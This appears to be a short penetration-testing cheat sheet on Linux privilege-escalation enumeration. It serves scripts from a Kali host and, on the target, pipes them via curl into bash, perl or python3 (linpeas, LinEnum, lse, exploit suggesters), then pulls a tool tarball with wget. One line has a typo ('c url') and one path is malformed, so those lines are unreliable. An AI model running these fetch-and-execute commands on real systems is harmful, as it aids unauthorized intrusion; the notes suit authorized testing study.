---
description: >-
  Linux privilege escalation tools to enumerate vulnerabilities for privilege
  escalation.
---

# Local Enumeration Tools

```bash
kali> sudo python3 -m http.server 80

# Target machine
curl http://192.168.119.128/privesc/linpeas.sh | bash 
curl http://192.168.119.128/privesc/LinEnum.sh | bash 
curl http://192.168.119.128/privesc/lse.sh | bash 
curl http://192.168.119.128/privesc/Linux-Exploit-Suggester2.sh | bash
curl http://192.168.119.128/privesc/Linux-Exploit-Suggester.sh | perl
c url http://192.168.119.128/privescsuid3num.py | python3 


wget http://192.168.119.129/privesc/privesc.tar.gz
tar xvfz privesc.tar.gz
```
